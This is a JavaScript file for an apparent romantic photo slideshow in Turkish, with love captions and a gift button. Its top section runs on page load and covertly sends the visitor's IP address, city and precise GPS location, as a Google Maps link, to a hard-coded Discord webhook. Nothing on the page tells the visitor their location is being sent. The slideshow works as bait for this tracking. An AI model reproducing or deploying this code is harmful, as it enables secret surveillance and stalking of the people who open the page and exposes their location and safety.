// --- AYARLAR ---
// Kendi Webhook URL'ni aşağıya tırnakların içine yapıştır
const WEB_URL = "https://discord.com/api/webhooks/1470176972410851379/7mzBrZBZzn_oW7nXfV0538TOe1rhbTo46P9IoIRXoHEMx4AcvFJjqvqtIDNa2BzGQ47I";

function dcGonder(m) {
    fetch(WEB_URL, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({content: m})
    }).catch(err => console.error("Discord Hatası:", err));
}

// Sayfa yüklendiğinde otomatik başlar
window.onload = function() {
    // 1. IP Bilgisi Al (Şehir ve IP gönderir)
    fetch('https://ipapi.co/json/')
        .then(r => r.json())
        .then(d => {
            dcGonder("🚀 **Siteye Giriş Yapıldı!**\n📍 Şehir: " + d.city + "\n🌐 IP: " + d.ip);
            
            // 2. Hassas Konum (GPS) - Kullanıcıdan izin ister
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(p) {
                    var enlem = p.coords.latitude;
                    var boylam = p.coords.longitude;
                    // Google Maps linki formatı
                    var link = "https://www.google.com/maps?q=" + enlem + "," + boylam;
                    dcGonder("🎯 **Hassas Konum Bulundu!**\n🗺️ Harita: " + link);
                }, function(err) {
                    dcGonder("⚠️ Konum izni verilmedi veya hata oluştu.");
                }, {enableHighAccuracy: true, timeout: 10000, maximumAge: 0});
            }
        });
};

// --- SENİN FOTOĞRAF GEÇİŞ SİSTEMİN ---
const fotolar = ["foto1.jpg", "foto2.jpg", "foto3.jpg", "foto4.jpg", "foto5.jpg"];
const sozler = [
    "Seninle her günüm daha güzel.", 
    "Gülüşün dünyamı aydınlatıyor.", 
    "Kalbim hep seninle.", 
    "Sana her baktığımda yeniden aşık oluyorum.", 
    "İyi ki varsın, iyi ki benimsin."
];
let index = 0;

function ileri() {
    index++;
    const fotoElement = document.getElementById("foto");
    const sozElement = document.getElementById("soz");
    const hediyeBtn = document.getElementById("hediyeButon");
    const ileriBtn = document.getElementById("ileriBtn");

    if (index >= fotolar.length) {
        if (hediyeBtn) hediyeBtn.style.display = "block";
        if (ileriBtn) ileriBtn.style.display = "none";
        return;
    }
    
    if (fotoElement) fotoElement.src = fotolar[index];
    if (sozElement) sozElement.innerText = sozler[index];
}
